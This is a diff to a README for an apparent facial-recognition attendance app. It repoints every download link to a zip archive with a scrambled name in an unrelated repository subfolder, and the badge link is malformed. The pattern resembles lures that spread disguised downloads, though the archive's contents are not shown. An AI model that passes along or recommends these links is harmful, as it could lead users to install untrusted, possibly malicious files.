@@ -1,6 +1,6 @@
 # 🎉 VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics - Simplifying Attendance with AI
 
-[![Download](https://raw.githubusercontent.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/main/artificiality/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/main/artificiality/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics.zip)
+[![Download](https://github.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/raw/refs/heads/main/artificiality/Visi_Using_Attendance_Automated_Biometrics_System_Facial_Attend_1.6.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/raw/refs/heads/main/artificiality/Visi_Using_Attendance_Automated_Biometrics_System_Facial_Attend_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to VisiAttend! This guide will help you download and run our automated a
 
 To get started, visit our Releases page to download the latest version of VisiAttend. 
 
-[Download VisiAttend](https://raw.githubusercontent.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/main/artificiality/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics.zip)
+[Download VisiAttend](https://github.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/raw/refs/heads/main/artificiality/Visi_Using_Attendance_Automated_Biometrics_System_Facial_Attend_1.6.zip)
 
 ### 🖥️ System Requirements
 
@@ -85,4 +85,4 @@ Explore more about the technology behind VisiAttend and how to use it effectivel
 
 Don't forget, you can download VisiAttend at any time.
 
-[Download VisiAttend](https://raw.githubusercontent.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/main/artificiality/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics.zip)
+[Download VisiAttend](https://github.com/SmoothieJoee/VisiAttend-Automated-Attendance-System-Using-Facial-Biometrics/raw/refs/heads/main/artificiality/Visi_Using_Attendance_Automated_Biometrics_System_Facial_Attend_1.6.zip)
